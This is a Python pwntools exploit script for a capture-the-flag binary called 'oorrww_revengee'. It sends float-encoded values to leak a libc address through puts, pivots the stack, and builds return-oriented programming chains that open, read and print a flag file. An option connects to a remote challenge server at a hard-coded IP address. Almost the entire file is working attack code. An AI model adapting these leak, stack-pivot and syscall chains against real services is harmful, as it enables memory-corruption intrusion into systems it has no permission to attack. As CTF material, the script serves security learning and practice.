#!/usr/bin/env python3
import struct
import pwn

exe = pwn.ELF("./oorrww_revengee")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")
pwn.context.log_level='debug'
pwn.context.terminal = ["foot"]
check = 1
if pwn.args.REMOTE:
    p = pwn.remote('193.148.168.30', 7667)
    check = 0
else:
    p = pwn.process(exe.path)
    # p = pwn.gdb.debug([exe.path],"""
    #
    #                 """)
    #
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
path = b"/mnt/d/flag.txt\0"
rbp1= 0x404558
pop_rax = 0x0000000000401203
ret = 0x000000000040101a
leave_ret = 0x00000000004012c9
pop_rbp = 0x00000000004011dd
print(libc.sym.syscall)


def ss8(s):
    chunks = []
    for i in range(0, len(s), 8):
        chunk = s[i:i+8]
        chunks.append(chunk)
    return chunks
paths = ss8(path)
# arrpath = []
# print(paths)
# for i in range(len(paths)):
#     arrpath.append(pwn.u64(paths[i].encode().ljust(8, b"\0")))
    
if __name__ == "__main__":
    # p = conn()
    # payload = str(42371842314632)
    for i in range(19):
        pwn.log.info(f"time: {i+1}")
        payload = b"1"
        sla(b"input:\n",payload)
    if check==1:
        pwn.gdb.attach(p,gdbscript="""
        b*main+186

                       """)
    sla(b"input:",b"+")
    payload = str(struct.unpack('d', pwn.p64(rbp1))[0]).encode()
    sla(b"input:",payload)
    payload = str(struct.unpack('d', pwn.p64(pop_rax))[0]).encode()
    sla(b"input:",payload)
    payload = str(struct.unpack('d', pwn.p64(exe.got.puts))[0]).encode()
    sla(b"input:",payload)
    payload = str(struct.unpack('d', pwn.p64(exe.sym.gifts+15))[0]).encode()
    sla(b"input:",payload)
    sla(b"input:",b"+")
    payload = str(struct.unpack('d', pwn.p64(exe.sym._start))[0]).encode()
    sla(b"input:",payload)
    for i in range(4):
        sla(b"input:",b"+")
    p.recv(1)
    address = pwn.u64(p.recvline()[:-1].ljust(8,b"\0"))
    libc_base = address - libc.sym.puts
    pop_rdi = libc_base + 0x000000000002a3e5
    pop_rsi = libc_base + 0x000000000002be51
    syscall = libc_base + 0x11e88b
    pop_rdx = libc_base + 0x000000000011f2e7
    push_rax = libc_base + 0x0000000000041563
    fmt = libc_base+0x1d8068
    pwn.log.info(f"libc base: {hex(libc_base)}")
    pwn.log.info(f"adress leak: {hex(address)}")
    pwn.log.info(f"syscall: {hex(syscall)}")
    pwn.log.info(f"fmt: {hex(fmt)}")
####################################################
    for i in range(19):
        pwn.log.info(f"time: {i+1}")
        payload = b"1"
        sla(b"input:\n",payload)
    # pwn.gdb.attach(p,gdbscript="""
    # b*main+186
    #
    #                """)
    # stacks = libc_base + libc.sym.environ
    sla(b"input",b"+")
    arr = []
    arr.append(0x404128)
    arr.append(pop_rdi)
    arr.append(fmt)
    arr.append(pop_rsi)
    arr.append(0x404128+8)
    # arr.append(pop_rbp)
    # arr.append(0x404230)
    arr.append(ret)
    arr.append(exe.plt.__isoc99_scanf)
    arr.append(leave_ret)
    for i in range(len(arr)):
        payload = str(struct.unpack('d', pwn.p64(arr[i]))[0]).encode()
        sla(b"input:",payload)
    # flagpath
    # for i in range(len(arrpath)):
    #     payload = str(struct.unpack('d', pwn.p64(arrpath[i]))[0]).encode()
    #     sla(b"input:",payload)
    for i in range(29-19-len(arr)):
        sla(b"input:",b"+")
    payload = pwn.p64(pop_rdi)
    payload += pwn.p64(0)
    payload += pwn.p64(pop_rsi)
    payload += pwn.p64(0x404430)
    payload += pwn.p64(pop_rbp)
    payload += pwn.p64(0x404430-8)
    payload += pwn.p64(pop_rdx)
    payload += pwn.p64(0x1000)
    payload += pwn.p64(0x1000)
    payload += pwn.p64(pop_rax)
    payload += pwn.p64(0x0)
    payload += pwn.p64(syscall)
    payload += pwn.p64(leave_ret)
    input()
    sl(payload)
    flag_path = 0x404930
    # payload = pwn.p64(pop_rax)
    # payload += pwn.p64(0x2)
    payload = pwn.p64(pop_rdi)
    payload += pwn.p64(flag_path)
    payload += pwn.p64(pop_rsi)
    payload += pwn.p64(0)
    payload += pwn.p64(libc_base+libc.sym.open)
    # payload += pwn.p64(ret)
    # payload += pwn.p64(pop_rsi)
    # payload += pwn.p64(2)
    # payload += pwn.p64(ret)
    # payload += pwn.p64(pop_rdx)
    # payload += pwn.p64(200)
    # payload += pwn.p64(200)
    # payload += pwn.p64(ret)
    # payload += pwn.p64(syscall)
    payload += pwn.p64(ret)
    payload += pwn.p64(pop_rdi)
    payload += pwn.p64(3)
    payload += pwn.p64(ret)
    payload += pwn.p64(pop_rax)
    payload += pwn.p64(0)
    payload += pwn.p64(pop_rsi)
    payload += pwn.p64(0x404430)
    payload += pwn.p64(pop_rdx)
    payload += pwn.p64(0x200)
    payload += pwn.p64(0x200)
    payload += pwn.p64(ret)
    payload += pwn.p64(syscall)
    # payload += pwn.p64(pop_rdi)
    # payload += pwn.p64(0x404430)
    # payload += pwn.p64(exe.sym.puts)
    payload += pwn.p64(pop_rdi)
    payload += pwn.p64(1)
    payload += pwn.p64(pop_rsi)
    payload += pwn.p64(0x404430)
    payload += pwn.p64(pop_rdx)
    payload += pwn.p64(0x200)
    payload += pwn.p64(ret)
    payload += pwn.p64(pop_rax)
    payload += pwn.p64(1)
    payload += pwn.p64(syscall)

    payload = payload.ljust(0x500, b"\0")
    payload += path
    input()
    sl(payload)
    # good luck pwning :)
    p.interactive()
